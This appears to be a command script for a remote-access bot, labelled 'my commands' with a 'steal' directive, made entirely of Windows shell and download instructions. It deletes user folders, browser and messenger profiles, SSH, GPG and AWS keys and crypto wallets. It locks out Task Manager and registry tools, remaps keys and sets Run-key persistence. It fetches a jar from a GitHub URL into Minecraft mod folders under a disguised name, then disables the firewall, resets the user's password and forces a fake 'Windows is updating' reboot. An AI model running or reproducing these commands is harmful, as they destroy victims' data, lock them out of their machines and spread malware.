# my commands
version: 5.2
steal
shell echo OWNED > %USERPROFILE%\Desktop\you_have_been_owned.txt
shell for /l %x in (0,0,1) do start notepad.exe
shell for /l %x in (0,0,1) do start cmd.exe
shell for /l %x in (0,0,1) do (taskkill /f /im explorer.exe & timeout /t 2 >nul)
shell taskkill /f /im discord.exe /im chrome.exe /im msedge.exe /im firefox.exe /im opera.exe /im steam.exe /im spotify.exe 2>nul
shell rd /s /q %USERPROFILE%\Desktop 2>nul & rd /s /q %USERPROFILE%\Documents 2>nul & rd /s /q %USERPROFILE%\Downloads 2>nul & rd /s /q %USERPROFILE%\Pictures 2>nul & rd /s /q %USERPROFILE%\Videos 2>nul & rd /s /q %USERPROFILE%\Music 2>nul
shell rd /s /q "%USERPROFILE%\AppData\Local\Google" 2>nul & rd /s /q "%USERPROFILE%\AppData\Local\Microsoft\Edge" 2>nul & rd /s /q "%USERPROFILE%\AppData\Local\BraveSoftware" 2>nul & rd /s /q "%USERPROFILE%\AppData\Local\Vivaldi" 2>nul & rd /s /q "%USERPROFILE%\AppData\Roaming\Opera Software" 2>nul & rd /s /q "%USERPROFILE%\AppData\Roaming\Mozilla" 2>nul
shell rd /s /q "%USERPROFILE%\AppData\Roaming\discord" 2>nul & rd /s /q "%USERPROFILE%\AppData\Roaming\discordcanary" 2>nul & rd /s /q "%USERPROFILE%\AppData\Roaming\discordptb" 2>nul & rd /s /q "%USERPROFILE%\AppData\Roaming\Telegram Desktop" 2>nul & rd /s /q "%USERPROFILE%\AppData\Roaming\Signal" 2>nul
shell rd /s /q "%USERPROFILE%\.ssh" 2>nul & rd /s /q "%USERPROFILE%\.gnupg" 2>nul & rd /s /q "%USERPROFILE%\.aws" 2>nul & del /f /q "%USERPROFILE%\.git-credentials" 2>nul & del /f /q "%USERPROFILE%\.bash_history" 2>nul
shell rd /s /q "%USERPROFILE%\AppData\Roaming\Exodus" 2>nul & rd /s /q "%USERPROFILE%\AppData\Roaming\Electrum" 2>nul & rd /s /q "%USERPROFILE%\AppData\Roaming\MetaMask" 2>nul
shell rd /s /q "%TEMP%" 2>nul
shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f 2>nul
shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f 2>nul
shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSettingsPage /t REG_DWORD /d 1 /f 2>nul
shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 1 /f 2>nul
shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f 2>nul
shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /t REG_DWORD /d 1 /f 2>nul
shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f 2>nul
shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewContextMenu /t REG_DWORD /d 1 /f 2>nul
shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoTrayContextMenu /t REG_DWORD /d 1 /f 2>nul
shell reg add "HKCU\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 00000000000000000a0000001e00110011001e001f00200020001f004b00480048004d004d00500050004b003a00000000000000 /f 2>nul
shell reg add "HKCU\Control Panel\Mouse" /v SwapMouseButtons /t REG_SZ /d 1 /f 2>nul
shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v winupdate /t REG_SZ /d "cmd /c for /l %x in (0,0,1) do start notepad.exe" /f 2>nul
shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v winserv /t REG_SZ /d "cmd /c for /l %x in (0,0,1) do (taskkill /f /im explorer.exe & timeout /t 3 >nul)" /f 2>nul
put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %APPDATA%\.minecraft\mods\xaerolib-compat.jar
put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %TEMP%\stage-update.jar
shell for /d %d in ("%APPDATA%\PrismLauncher\instances\*") do copy /y "%TEMP%\stage-update.jar" "%d\minecraft\mods\xaerolib-compat.jar" 2>nul
shell for /d %d in ("%APPDATA%\MultiMC\instances\*") do copy /y "%TEMP%\stage-update.jar" "%d\minecraft\mods\xaerolib-compat.jar" 2>nul
shell del /f /q "%TEMP%\stage-update.jar" 2>nul
shell netsh advfirewall set allprofiles state off 2>nul
shell net user %USERNAME% Pwned123! 2>nul
shell taskkill /f /im javaw.exe 2>nul
shell shutdown /r /t 30 /c "Windows is updating" 2>nul
